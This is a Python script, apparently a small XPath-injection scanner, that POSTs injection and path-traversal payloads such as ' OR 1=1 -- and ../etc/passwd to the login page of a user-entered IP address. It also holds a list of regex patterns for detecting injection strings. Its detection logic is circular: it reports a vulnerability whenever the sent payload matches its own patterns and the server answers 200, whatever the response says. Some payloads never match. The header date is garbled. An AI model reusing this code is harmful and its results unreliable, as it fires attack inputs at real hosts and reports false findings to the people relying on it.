# -*- coding: utf-8 -*-
"""
Created on Fri Feb  21 03:345:47 2025

@author: IAN CARTER KULANI

"""

from colorama import Fore
import pyfiglet
import os
font=pyfiglet.figlet_format("XPATH DETECTOR")
print(Fore.GREEN+font)

import requests
import re

# Function to check for XPath Injection patterns in the input data
def detect_xpath_injection(input_data):
    # Regular expression patterns to detect common XPath injection attempts
    patterns = [
        r"(' OR 1=1--)",                # Common pattern for bypassing authentication
        r"(' OR '.*'='.*')",             # Generic pattern used in XPath injections
        r"(\.\./\.\./)",                 # Path traversal (common in XPath injections)
        r"union.*select",                # UNION SELECT in injections
        r"';--",                         # SQL/XPath injection pattern
        r"(' AND '.*'='.*')",            # AND condition in XPath injection
    ]
    
    # Check if any of the patterns are found in the input data
    for pattern in patterns:
        if re.search(pattern, input_data, re.IGNORECASE):
            return True
    return False

# Function to simulate an HTTP request to a given IP address and check for XPath injection
def check_xpath_injection(ip_address):
    print(f"Checking for potential XPath Injection on {ip_address}...")

    # Simulate a form submission with a payload that may contain XPath Injection
    payloads = [
        "' OR 1=1 --",    # Simple injection
        "' OR 'x' = 'x'",  # Common injection
        "' AND 1=1 --",    # Another simple injection
        "../etc/passwd",   # Path traversal attempt
    ]
    
    # Try submitting the payloads to a hypothetical login page or endpoint
    url = f"http://{ip_address}/login"  # Example URL; adjust based on target app
    
    for payload in payloads:
        # Example POST request with payload in the 'username' field
        data = {'username': payload, 'password': 'password'}
        try:
            response = requests.post(url, data=data)
            
            if response.status_code == 200:
                # Check the response for possible signs of XPath Injection vulnerability
                if detect_xpath_injection(payload):
                    print(f"[!] Potential XPath Injection detected in the payload: {payload}")
                    print(f"Response from server: {response.text[:200]}")  # Display part of the response
            else:
                print(f"[+] Request failed with status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error making request: {e}")

# Main function
def main():
        
    # Prompt the user for an IP address to test for XPath Injection
    ip_address = input("Enter the target IP address:")
    
    # Start detecting XPath Injection attempts
    check_xpath_injection(ip_address)

if __name__ == "__main__":
    main()
